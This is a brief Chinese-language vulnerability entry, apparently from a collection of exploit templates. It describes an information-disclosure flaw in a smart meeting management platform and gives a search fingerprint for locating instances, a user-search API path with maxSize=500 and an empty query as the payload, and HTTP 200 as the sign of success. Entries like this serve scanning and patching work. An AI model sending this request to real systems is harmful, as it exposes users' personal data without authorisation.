# 智能会议管理平台-search-info-leak-信息泄露漏洞

智能会议管理平台-search-info-leak ｜ 信息泄露 ｜ —
- **指纹**：`body="smmweb/security"`

**Payload**
```
/meeting/v1/service/user/search?maxSize=500&query=
```
- **响应特征**：200